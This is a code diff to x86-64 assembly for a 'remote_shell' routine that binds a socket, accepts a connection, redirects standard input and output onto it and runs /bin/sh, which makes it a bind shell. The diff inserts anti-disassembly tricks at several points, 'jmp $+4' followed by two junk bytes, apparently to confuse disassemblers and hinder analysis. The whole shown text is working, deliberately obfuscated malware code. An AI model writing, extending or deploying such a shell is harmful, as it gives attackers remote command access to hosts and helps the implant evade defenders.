@@ -1,5 +1,7 @@
 remote_shell:
 	enter REMOTE_SHELL_STACK_SIZE, 0
+    jmp $+4
+	db `\x0f\x11`
     ; Create socket
     mov rdi, AF_INET
     mov rsi, SOCK_STREAM
@@ -21,6 +23,8 @@ remote_shell:
     mov rax, SYS_SETSOCKOPT
     syscall
 
+	jmp $+4
+	db `\x48\xc7`
     ; Initialize sockaddr struct to bind socket using it
 	mov word [rsp + sockaddr_in.family], AF_INET
 	mov word [rsp + sockaddr_in.port], PORT
@@ -32,6 +36,8 @@ remote_shell:
     mov rsi, rsp
     mov rdx, sockaddr_in_size
     mov rax, SYS_BIND
+    jmp $+4
+    db `\x69\x61`
     syscall
     cmp rax, 0
     js remote_shell_close_host
@@ -44,6 +50,8 @@ remote_shell:
     cmp rax, 0
     js remote_shell_close_host
 
+	jmp $+4
+	db `\x0f\x11`
     ; Accept incoming connection, don't store data, just use the sockfd created
     mov rdi, rbx
     xor rsi, rsi
@@ -52,6 +60,8 @@ remote_shell:
     syscall
     mov r12, rax
 
+	jmp $+4
+	db `\x64\x48`
     ; Duplicate file descriptors for STDIN, STDOUT and STDERR
     mov rdi, rax
     mov rax, SYS_DUP2
@@ -64,6 +74,7 @@ remote_shell:
     inc rsi
     syscall
 
+
     lea rdi, [rel bin_sh.sh]
     mov [rsp + sockaddr_in_size], rdi
     lea rdi, [rel bin_sh.arg1]
@@ -73,12 +84,16 @@ remote_shell:
     xor rdi, rdi
     mov [rsp + sockaddr_in_size + 24], rdi
     ; Execute /bin/sh 
+    jmp $+4
+    db `\x48\x8b`
     lea rdi, [rel bin_sh]
     lea rsi, [rsp + sockaddr_in_size]
     xor rdx, rdx
     mov rax, SYS_EXECVE
     syscall
 
+	jmp $+4
+	db `\x48\x83`
     mov rdi, r12
     mov rax, SYS_CLOSE
     syscall
